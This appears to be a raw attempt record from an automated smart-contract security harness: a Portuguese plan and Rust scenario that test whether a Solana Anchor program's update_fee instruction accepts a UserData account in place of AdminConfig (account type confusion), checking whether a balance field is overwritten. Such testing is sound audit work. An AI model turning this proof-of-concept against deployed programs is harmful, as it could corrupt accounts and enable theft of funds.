attempts.raw:
{
  "plan": "O programa usa Account<'info, AdminConfig> que verifica o discriminador do tipo AdminConfig. A hipotese de COSPLAY e que uma conta do tipo UserData (com discriminador diferente) seja aceita no lugar de AdminConfig. Vou preparar uma conta AdminConfig legitima com admin = authority e fee_basis_points = 100, e uma conta UserData com authority = authority e balance = 999. O baseline chama update_fee com a conta AdminConfig (deve ter sucesso). O ataque chama update_fee passando a conta UserData no lugar de config; se o programa aceitar, o campo balance (offset 40) sera sobrescrito com new_fee, demonstrando o dano.",
  "scenario": "let authority = Pubkey::new_unique();
let admin_config_key = Pubkey::new_unique();
let user_data_key = Pubkey::new_unique();

let admin_config_data = anchor_account_data("AdminConfig", &(authority, 100u64));
let user_data_data = anchor_account_data("UserData", &(authority, 999u64));

let admin_config_account = account(&env.program_id, &admin_config_data, None);
let user_data_account = account(&env.program_id, &user_data_data, None);
let authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(admin_config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix = env.anchor_ix("update_fee", &(500u64,), metas);

let contas = vec![
    (admin_config_key, admin_config_account.clone()),
    (authority, authority_account.clone()),
];

let baseline = env.baseline("update_fee legitimo com AdminConfig", &ix, &contas);

let metas_attack = vec![
    AccountMeta::new(user_data_key, false),
    AccountMeta::new_readonly(authority, true),
];
let ix_attack = env.anchor_ix("update_fee", &(500u64,), metas_attack);

let contas_attack = vec![
    (user_data_key, user_data_account.clone()),
    (authority, authority_account.clone()),
];

let r = env.attack("update_fee com UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let data = after(&r, &user_data_key).data();
    env.effect("balance da UserData sobrescrito com new_fee (cosplay aceito)", read_u64(data, 40) == 500u64);
}"
}

